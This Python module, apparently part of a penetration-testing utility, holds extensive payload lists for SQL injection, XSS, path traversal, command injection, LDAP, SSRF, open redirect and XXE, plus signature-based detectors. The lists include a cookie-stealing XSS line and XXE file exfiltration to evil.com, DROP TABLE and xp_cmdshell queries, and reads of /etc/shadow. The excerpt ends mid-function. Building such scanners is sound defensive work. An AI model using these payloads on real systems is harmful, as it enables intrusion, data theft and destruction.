"""Security testing utilities for penetration testing and vulnerability scanning.

This module provides comprehensive security testing utilities for detecting
and testing common web application vulnerabilities including SQL injection,
XSS, authentication bypass, path traversal, command injection, and more.

Example:
    >>> tester = SecurityTester()
    >>> result = tester.test_sql_injection("SELECT * FROM users WHERE id = {input}")
    >>> print(result.vulnerable)
    True
"""

from __future__ import annotations

import html
import re
import string
from collections.abc import Iterator
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Final


class VulnerabilitySeverity(Enum):
    """Severity levels for detected vulnerabilities."""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnerabilityType(Enum):
    """Types of security vulnerabilities."""

    SQL_INJECTION = "sql_injection"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    CSRF = "csrf"
    OPEN_REDIRECT = "open_redirect"
    HEADER_INJECTION = "header_injection"
    CRLF_INJECTION = "crlf_injection"
    INFORMATION_DISCLOSURE = "information_disclosure"
    RATE_LIMITING = "rate_limiting"
    BROKEN_ACCESS_CONTROL = "broken_access_control"


@dataclass
class VulnerabilityFinding:
    """Represents a detected vulnerability.

    Attributes:
        vuln_type: The type of vulnerability detected.
        severity: The severity level of the vulnerability.
        title: Human-readable title for the finding.
        description: Detailed description of the vulnerability.
        payload: The payload that triggered the vulnerability.
        location: Where the vulnerability was found.
        evidence: Evidence supporting the finding.
        remediation: Suggested fix for the vulnerability.
        references: Links to relevant documentation.
        cwe: CWE identifier if applicable.
        owasp: OWASP category if applicable.
    """

    vuln_type: VulnerabilityType
    severity: VulnerabilitySeverity
    title: str
    description: str
    payload: str
    location: str = ""
    evidence: str = ""
    remediation: str = ""
    references: list[str] = field(default_factory=list)
    cwe: str | None = None
    owasp: str | None = None


@dataclass
class SecurityTestResult:
    """Result of a security test.

    Attributes:
        target: The target that was tested.
        vulnerable: Whether a vulnerability was detected.
        findings: List of vulnerability findings.
        test_duration_ms: Time taken for the test in milliseconds.
        payloads_tested: Number of payloads tested.
        errors: Any errors encountered during testing.
    """

    target: str
    vulnerable: bool = False
    findings: list[VulnerabilityFinding] = field(default_factory=list)
    test_duration_ms: float = 0.0
    payloads_tested: int = 0
    errors: list[str] = field(default_factory=list)


class SQLInjectionPayloads:
    """SQL injection test payloads organized by database type and technique.

    This class provides comprehensive SQL injection payloads for testing
    various injection techniques including:
        - Boolean-based blind injection
        - Time-based blind injection
        - Error-based injection
        - UNION-based injection
        - Stacked queries

    Example:
        >>> for payload in SQLInjectionPayloads.basic():
        ...     test_input(payload)
    """

    BASIC: Final[list[str]] = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        '" OR "1"="1',
        '" OR "1"="1"--',
        "1' OR '1'='1",
        "1 OR 1=1",
        "1 OR 1=1--",
        "' OR ''='",
        "'='",
        "' OR 1=1#",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ]

    UNION: Final[list[str]] = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL, NULL--",
        "1 UNION SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns--",
        "-1 UNION SELECT 1,2,3--",
        "1' UNION SELECT 1,2,3'",
    ]

    TIME_BASED: Final[list[str]] = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:10'--",
        "1; SELECT SLEEP(5)--",
        "1; SELECT SLEEP(10)--",
        "' AND SLEEP(5)--",
        "' AND SLEEP(10)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
        "'; SELECT pg_sleep(5)--",
        "'; SELECT pg_sleep(10)--",
        "1' AND pg_sleep(5)--",
        "1 OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    ERROR_BASED: Final[list[str]] = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        (
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x "
            "FROM information_schema.tables GROUP BY x)a)--"
        ),
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND 1=CAST(@@version AS INT)--",
    ]

    STACKED_QUERIES: Final[list[str]] = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "'; UPDATE users SET password='hacked'--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC sp_executesql N'SELECT * FROM users'--",
    ]

    MYSQL_SPECIFIC: Final[list[str]] = [
        "' AND 1=1 UNION SELECT 1,2,3,4,5--",
        (
            "' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users "
            "ORDER BY username LIMIT 0,1),1,1))>64--"
        ),
        "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT VERSION())))--",
        "' INTO OUTFILE '/tmp/output.txt'--",
        "' LOAD_FILE('/etc/passwd')--",
    ]

    POSTGRESQL_SPECIFIC: Final[list[str]] = [
        "'; COPY (SELECT * FROM users) TO '/tmp/output.txt'--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "'; SELECT * FROM pg_catalog.pg_tables--",
        "' UNION SELECT usename,passwd FROM pg_shadow--",
        "' AND pg_sleep(5)--",
    ]

    MSSQL_SPECIFIC: Final[list[str]] = [
        "'; EXEC master..xp_cmdshell 'dir'--",
        "' AND 1=CONVERT(INT,(SELECT @@version))--",
        "' UNION SELECT name,master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins--",
        "'; EXEC sp_configure 'show advanced options',1--",
        "'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1--",
    ]

    ORACLE_SPECIFIC: Final[list[str]] = [
        "' UNION SELECT table_name,NULL FROM all_tables--",
        "' UNION SELECT column_name,NULL FROM all_tab_columns--",
        "' AND 1=(SELECT 1 FROM dual WHERE UTL_INADDR.get_host_address='test')--",
        "' UNION SELECT username,password FROM all_users--",
        "'; EXECUTE IMMEDIATE 'SELECT * FROM users'--",
    ]

    ENCODING_BYPASS: Final[list[str]] = [
        "%27%20OR%20%271%27%3D%271",
        "%27%27%20OR%20%27%27%3D%27%27",
        "%2527%20OR%20%25271%2527%3D%25271",
        "%%27%20OR%20%%271%%27%3D%%271",
        "'%20oR%20'1'='1",
        "'/**/OR/**/'1'='1",
        "'\tOR\t'1'='1",
        "'%0aOR%0a'1'='1",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all SQL injection payloads.

        Yields:
            All SQL injection test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads

    @classmethod
    def by_technique(cls, technique: str) -> list[str]:
        """Get payloads by injection technique.

        Args:
            technique: One of 'basic', 'union', 'time_based', 'error_based',
                      'stacked_queries', 'encoding_bypass'.

        Returns:
            List of payloads for the specified technique.
        """
        technique_map = {
            "basic": cls.BASIC,
            "union": cls.UNION,
            "time_based": cls.TIME_BASED,
            "error_based": cls.ERROR_BASED,
            "stacked_queries": cls.STACKED_QUERIES,
            "mysql": cls.MYSQL_SPECIFIC,
            "postgresql": cls.POSTGRESQL_SPECIFIC,
            "mssql": cls.MSSQL_SPECIFIC,
            "oracle": cls.ORACLE_SPECIFIC,
            "encoding_bypass": cls.ENCODING_BYPASS,
        }
        return technique_map.get(technique.lower(), [])


class XSSPayloads:
    """Cross-Site Scripting (XSS) test payloads.

    Provides comprehensive XSS payloads for testing:
        - Reflected XSS
        - Stored XSS
        - DOM-based XSS
        - Filter bypass techniques

    Example:
        >>> for payload in XSSPayloads.basic():
        ...     test_input(payload)
    """

    BASIC: Final[list[str]] = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script src='https://evil.com/xss.js'></script>",
        "<script>document.location='https://evil.com/?c='+document.cookie</script>",
    ]

    EVENT_HANDLERS: Final[list[str]] = [
        "<img src=x onerror=alert('XSS')>",
        "<img src='x' onerror='alert(1)'>",
        "<img src=1 onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<input onblur=alert('XSS') autofocus><input autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror='alert(1)'>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
    ]

    TAG_BYPASS: Final[list[str]] = [
        "<<script>alert('XSS')//<</script>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<script<script>>alert('XSS')</script</script>>",
        "<svg><script>alert('XSS')</script>",
        "<math><script>alert('XSS')</script>",
        "<script/xss>alert('XSS')</script>",
        "<script\\x20>alert('XSS')</script>",
        "<script\\x09>alert('XSS')</script>",
        "<script\\x0A>alert('XSS')</script>",
        "<script\\x0D>alert('XSS')</script>",
    ]

    PROTOCOL_HANDLERS: Final[list[str]] = [
        "javascript:alert('XSS')",
        "javascript:void(alert('XSS'))",
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "vbscript:msgbox('XSS')",
        "javascript&#58;alert('XSS')",
        "java&#x09;script:alert('XSS')",
    ]

    ENCODED: Final[list[str]] = [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "%253Cscript%253Ealert('XSS')%253C/script%253E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
    ]

    POLYGLOT: Final[list[str]] = [
        (
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a"
            "//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
        ),
        "'\">'><script>alert('XSS')</script>",
        "'\"--><script>alert('XSS')</script>",
        "javascript:alert('XSS');//';alert(String.fromCharCode(88,83,83))//",
        "'-alert(1)-'",
        "\\'-alert(1)//",
        "<img/src='x'onerror=alert(1)>",
    ]

    CSP_BYPASS: Final[list[str]] = [
        "<link rel='import' href='https://evil.com/xss.html'>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<form action='javascript:alert(1)'><input type=submit>",
        "<base href='javascript://'>",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all XSS payloads.

        Yields:
            All XSS test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads

    @classmethod
    def by_category(cls, category: str) -> list[str]:
        """Get payloads by XSS category.

        Args:
            category: One of 'basic', 'event_handlers', 'tag_bypass',
                     'protocol_handlers', 'encoded', 'polyglot', 'csp_bypass'.

        Returns:
            List of payloads for the specified category.
        """
        category_map = {
            "basic": cls.BASIC,
            "event_handlers": cls.EVENT_HANDLERS,
            "tag_bypass": cls.TAG_BYPASS,
            "protocol_handlers": cls.PROTOCOL_HANDLERS,
            "encoded": cls.ENCODED,
            "polyglot": cls.POLYGLOT,
            "csp_bypass": cls.CSP_BYPASS,
        }
        return category_map.get(category.lower(), [])


class PathTraversalPayloads:
    """Path traversal (Directory Traversal) test payloads.

    Provides payloads for testing path traversal vulnerabilities including
    various encoding techniques and OS-specific variants.

    Example:
        >>> for payload in PathTraversalPayloads.basic():
        ...     test_path(payload)
    """

    BASIC: Final[list[str]] = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "../../../../../../",
        "../../../../../../../",
        "../../../../../../../../",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../windows/system32/config/sam",
    ]

    NULL_BYTE: Final[list[str]] = [
        "../etc/passwd%00",
        "../etc/passwd%00.jpg",
        "../etc/passwd%00.html",
        "../../windows/system32/config/sam%00",
        "..%00/",
        "%00../",
    ]

    DOUBLE_ENCODING: Final[list[str]] = [
        "..%252f",
        "..%252f..%252f",
        "..%255c",
        "..%255c..%255c",
        "%252e%252e%252f",
        "%252e%252e%252f%252e%252e%252f",
    ]

    UTF8_ENCODING: Final[list[str]] = [
        "..%c0%af",
        "..%c1%9c",
        "%c0%ae%c0%ae/",
        "%c0%ae%c0%ae%c0%af",
        "..%e0%80%af",
        "..%c0%9v",
    ]

    URL_ENCODING: Final[list[str]] = [
        "%2e%2e%2f",
        "%2e%2e/",
        "..%2f",
        "%2e%2e%5c",
        "%2e%2e\\",
        "..%5c",
    ]

    WRAPPER_BYPASS: Final[list[str]] = [
        "....//",
        "....//....//",
        "....\\",
        "....\\....\\",
        "file:///etc/passwd",
        "file:///c:/windows/system32/config/sam",
    ]

    COMMON_FILES: Final[dict[str, list[str]]] = {
        "linux": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/issue",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
            "/var/log/auth.log",
        ],
        "windows": [
            "c:/windows/system32/config/sam",
            "c:/windows/system32/config/system",
            "c:/windows/win.ini",
            "c:/windows/system.ini",
            "c:/boot.ini",
            "c:/inetpub/logs/logfiles/",
        ],
        "web": [
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "/app/config/database.yml",
            "/app/.env",
            "/app/config/secrets.yml",
        ],
    }

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all path traversal payloads.

        Yields:
            All path traversal test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class CommandInjectionPayloads:
    """Command injection (OS Command Injection) test payloads.

    Provides payloads for testing command injection vulnerabilities
    across different operating systems and shells.

    Example:
        >>> for payload in CommandInjectionPayloads.unix_basic():
        ...     test_command(payload)
    """

    UNIX_BASIC: Final[list[str]] = [
        "; ls",
        "| ls",
        "|| ls",
        "&& ls",
        "& ls",
        "$(ls)",
        "`ls`",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
    ]

    UNIX_BLIND: Final[list[str]] = [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
    ]

    WINDOWS_BASIC: Final[list[str]] = [
        "& dir",
        "| dir",
        "&& dir",
        "|| dir",
        "& type c:\\windows\\win.ini",
        "| type c:\\windows\\win.ini",
        "& net user",
        "| ipconfig /all",
    ]

    WINDOWS_BLIND: Final[list[str]] = [
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
        "&& ping -n 5 127.0.0.1",
        "|| ping -n 5 127.0.0.1",
        "& timeout 5",
        "| timeout 5",
    ]

    ENCODED: Final[list[str]] = [
        "%3Bls",
        "%7Cls",
        "%26%26ls",
        "%26ls",
        "%60ls%60",
        "%24%28ls%29",
        "%3Bcat%20/etc/passwd",
    ]

    NEWLINE_INJECTION: Final[list[str]] = [
        "\nls",
        "\r\nls",
        "%0als",
        "%0d%0als",
        "\n cat /etc/passwd",
        "%0acat%20/etc/passwd",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all command injection payloads.

        Yields:
            All command injection test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class LDAPInjectionPayloads:
    """LDAP injection test payloads.

    Provides payloads for testing LDAP injection vulnerabilities
    in directory services.

    Example:
        >>> for payload in LDAPInjectionPayloads.basic():
        ...     test_ldap_filter(payload)
    """

    BASIC: Final[list[str]] = [
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&))",
        "*)(|(cn=*))",
        "*)((|userPassword=*)",
        "*)(|(objectclass=*)",
        "x' or 'x'='x",
        "x' or uid='x'='x",
    ]

    AUTHENTICATION_BYPASS: Final[list[str]] = [
        "*)(&",
        "*)(|(cn=*))",
        "admin)(&)",
        "*)(uid=*))(|(uid=*",
        "*)((cn=*))",
        "*)(cn=*))(|(cn=*",
        "admin)(|(password=*))",
        "*)(objectClass=*))(|(objectClass=*",
    ]

    BLIND: Final[list[str]] = [
        "*)(cn=a*))(|(cn=*",
        "*)(cn=a*))%00",
        "admin)(cn=*))%00",
        "*)(|(mail=*))",
        "*)(uid=*))%00",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all LDAP injection payloads.

        Yields:
            All LDAP injection test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class AuthBypassPayloads:
    """Authentication bypass test payloads and techniques.

    Provides payloads and techniques for testing authentication
    bypass vulnerabilities.

    Example:
        >>> for payload in AuthBypassPayloads.sql_auth_bypass():
        ...     test_auth_bypass(payload)
    """

    SQL_AUTH_BYPASS: Final[list[str]] = [
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR ''='",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1--",
        "') OR ('x'='x",
        "1' OR '1' = '1",
        "' OR 1=1 LIMIT 1 --",
    ]

    NO_SQL_AUTH_BYPASS: Final[list[str]] = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$gt": null}',
        '{"$ne": 1}',
        '{"$or": [{"username": "admin"}, {"username": {"$ne": "admin"}}]}',
        '{"username": "admin", "password": {"$ne": ""}}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"$where": "1==1"}',
    ]

    HEADER_INJECTION: Final[list[str]] = [
        "X-Forwarded-For: 127.0.0.1",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Forwarded-Host: localhost",
        "X-Host: localhost",
    ]

    PATH_MANIPULATION: Final[list[str]] = [
        "/admin/..;/user",
        "/admin/../admin",
        "/admin%2f..%2fuser",
        "/admin/./",
        "//admin//",
        "/admin%00",
        "/%2e%2e/admin",
        "/admin/..%00/",
    ]

    PARAMETER_MANIPULATION: Final[list[str]] = [
        "role=admin",
        "is_admin=true",
        "admin=1",
        "debug=true",
        "access_level=high",
        "authenticated=true",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all auth bypass payloads.

        Yields:
            All authentication bypass test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class SSRFPPayloads:
    """Server-Side Request Forgery (SSRF) test payloads.

    Provides payloads for testing SSRF vulnerabilities.

    Example:
        >>> for payload in SSRFPayloads.basic():
        ...     test_ssrf(payload)
    """

    BASIC: Final[list[str]] = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://127.0.0.1:22",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
    ]

    INTERNAL_SERVICES: Final[list[str]] = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/opc/v1/",
        "http://169.254.169.254/metadata/v1/instance?api-version=2021-02-01",
        "http://internal.example.com",
        "http://admin.internal.local",
    ]

    BYPASS_TECHNIQUES: Final[list[str]] = [
        "http://127.1",
        "http://127.000.000.001",
        "http://2130706433",
        "http://0x7f000001",
        "http://0177.0.0.1",
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
        "http://localhost.evil.com",
        "http:// Evil.com@127.0.0.1",
    ]

    URL_ENCODING: Final[list[str]] = [
        "http://%31%32%37%2e%30%2e%30%2e%31",
        "http://%31%32%37%2e%30%2e%30%2e%31%3a%38%30",
        "http://0x7f.0x0.0x0.0x1",
        "http://0177.0.0.1",
        "http://017700000001",
        "http://0x7f000001",
    ]

    PROTOCOL_ABUSE: Final[list[str]] = [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:70/",
        "dict://127.0.0.1:11211/stats",
        "sftp://evil.com",
        "ldap://127.0.0.1:389/",
        "tftp://127.0.0.1:69/",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all SSRF payloads.

        Yields:
            All SSRF test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class OpenRedirectPayloads:
    """Open redirect test payloads.

    Provides payloads for testing open redirect vulnerabilities.

    Example:
        >>> for payload in OpenRedirectPayloads.basic():
        ...     test_redirect(payload)
    """

    BASIC: Final[list[str]] = [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "/\\evil.com",
        "\\/evil.com",
        "https:evil.com",
        "https:/evil.com",
        "//evil%E3%80%82com",
    ]

    PARAMETER_POLLUTION: Final[list[str]] = [
        "https://example.com@evil.com",
        "https://evil.com#example.com",
        "https://evil.com?example.com",
        "https://evil.com%00example.com",
        "https://evil.com%0d%0aexample.com",
    ]

    ENCODED: Final[list[str]] = [
        "%2F%2Fevil.com",
        "%2F%5Cevil.com",
        "%5C%2Fevil.com",
        "https%3A%2F%2Fevil.com",
        "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
    ]

    BYPASS_TECHNIQUES: Final[list[str]] = [
        "https://evil.com%00.example.com",
        "https://evil.com%01.example.com",
        "//evil%00.com",
        "https://example.com.evil.com",
        "https://evilexample.com",
        "https://evil.com\\@example.com",
        "https://example.com.evil.com/path",
        "https://example-com.evil.com",
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all open redirect payloads.

        Yields:
            All open redirect test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class XXEPayloads:
    """XML External Entity (XXE) test payloads.

    Provides payloads for testing XXE vulnerabilities.

    Example:
        >>> for payload in XXEPayloads.basic():
        ...     test_xml(payload)
    """

    BASIC: Final[list[str]] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ]

    PARAMETER_ENTITY: Final[list[str]] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://evil.com/xxe.dtd">%xxe;]><foo></foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    ]

    BLIND: Final[list[str]] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://evil.com/collect">%xxe;]>',
        (
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd">'
            "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'https://evil.com/?d=%file;'>\">"
            "%eval;%exfil;]><data>test</data>"
        ),
    ]

    DTD_EXTERNAL: Final[list[str]] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://evil.com/xxe.dtd">%xxe;]><foo></foo>',
    ]

    @classmethod
    def all_payloads(cls) -> Iterator[str]:
        """Iterate over all XXE payloads.

        Yields:
            All XXE test payloads.
        """
        for attr_name in dir(cls):
            if attr_name.isupper() and not attr_name.startswith("_"):
                payloads = getattr(cls, attr_name)
                if isinstance(payloads, list):
                    yield from payloads


class SecurityTester:
    """Main security testing utility class.

    Provides methods for testing various security vulnerabilities
    using the defined payload classes.

    Example:
        >>> tester = SecurityTester()
        >>> result = tester.test_sql_injection("' OR '1'='1")
        >>> print(result.vulnerable)
        True
    """

    SQL_ERROR_SIGNATURES: Final[list[str]] = [
        "sql syntax",
        "mysql_fetch",
        "ORA-",
        "PLS-",
        "unclosed quotation",
        "quoted string not properly terminated",
        "pg_query",
        "Warning: pg_",
        "valid PostgreSQL result",
        "postgresql",
        "syntax error",
        "invalid query",
        "ODBC Microsoft Access Driver",
        "ODBC SQL Server Driver",
        "SQLServer JDBC Driver",
        "Incorrect syntax near",
        "Microsoft OLE DB Provider",
    ]

    XSS_RESPONSE_SIGNATURES: Final[list[str]] = [
        "<script>",
        "javascript:",
        "onerror=",
        "onload=",
        "onclick=",
        "onmouseover=",
        "<svg",
        "<img",
        "<iframe",
    ]

    PATH_TRAVERSAL_SIGNATURES: Final[list[str]] = [
        "root:",
        "[extensions]",
        "[fonts]",
        "boot loader",
        "daemon:",
        "nobody:",
        "/bin/bash",
        "www-data:",
    ]

    def __init__(
        self,
        timeout_seconds: float = 30.0,
        max_payloads: int | None = None,
        custom_payloads: dict[str, list[str]] | None = None,
    ) -> None:
        """Initialize the security tester.

        Args:
            timeout_seconds: Maximum time per test in seconds.
            max_payloads: Maximum number of payloads to test per category.
            custom_payloads: Custom payloads to add to built-in sets.
        """
        self.timeout_seconds = timeout_seconds
        self.max_payloads = max_payloads
        self._custom_payloads = custom_payloads or {}

    def detect_sql_injection(
        self,
        response_body: str,
        response_headers: dict[str, str] | None = None,
    ) -> VulnerabilityFinding | None:
        """Detect SQL injection vulnerability from response.

        Analyzes response for SQL error signatures indicating potential
        SQL injection vulnerability.

        Args:
            response_body: The HTTP response body to analyze.
            response_headers: Optional response headers to analyze.

        Returns:
            VulnerabilityFinding if vulnerability detected, None otherwise.
        """
        response_lower = response_body.lower()

        for signature in self.SQL_ERROR_SIGNATURES:
            if signature.lower() in response_lower:
                return VulnerabilityFinding(
                    vuln_type=VulnerabilityType.SQL_INJECTION,
                    severity=VulnerabilitySeverity.HIGH,
                    title="SQL Injection Vulnerability Detected",
                    description=(
                        "SQL error message detected in response, "
                        "indicating potential SQL injection."
                    ),
                    payload="",
                    evidence=f"Found signature: {signature}",
                    remediation=(
                        "Use parameterized queries or prepared statements. "
                        "Implement input validation and sanitization."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://cwe.mitre.org/data/definitions/89.html",
                    ],
                    cwe="CWE-89",
                    owasp="A03:2021 - Injection",
                )

        return None

    def detect_xss(
        self,
        response_body: str,
        payload: str,
    ) -> VulnerabilityFinding | None:
        """Detect XSS vulnerability from response.

        Analyzes response to determine if injected payload is reflected
        without proper sanitization.

        Args:
            response_body: The HTTP response body to analyze.
            payload: The XSS payload that was injected.

        Returns:
            VulnerabilityFinding if vulnerability detected, None otherwise.
        """
        if payload.lower() in response_body.lower():
            severity = VulnerabilitySeverity.HIGH
            if "<script>" in payload.lower() or "javascript:" in payload.lower():
                severity = VulnerabilitySeverity.HIGH
            elif "onerror=" in payload.lower() or "onload=" in payload.lower():
                severity = VulnerabilitySeverity.MEDIUM

            return VulnerabilityFinding(
                vuln_type=VulnerabilityType.XSS_REFLECTED,
                severity=severity,
                title="Cross-Site Scripting (XSS) Vulnerability",
                description=(
                    "Injected payload is reflected in response without proper sanitization."
                ),
                payload=payload,
                evidence=f"Payload '{payload}' found unescaped in response",
                remediation=(
                    "Encode output using context-appropriate encoding. "
                    "Implement Content-Security-Policy headers. "
                    "Use HttpOnly flag for cookies."
                ),
                references=[
                    "https://owasp.org/www-community/attacks/xss/",
                    "https://cwe.mitre.org/data/definitions/79.html",
                ],
                cwe="CWE-79",
                owasp="A03:2021 - Injection",
            )

        return None

    def detect_path_traversal(
        self,
        response_body: str,
        payload: str,
    ) -> VulnerabilityFinding | None:
        """Detect path traversal vulnerability from response.

        Analyzes response for indicators of successful path traversal.

        Args:
            response_body: The HTTP response body to analyze.
            payload: The path traversal payload that was used.

        Returns:
            VulnerabilityFinding if vulnerability detected, None otherwise.
        """
        for signature in self.PATH_TRAVERSAL_SIGNATURES:
            if signature.lower() in response_body.lower():
                return VulnerabilityFinding(
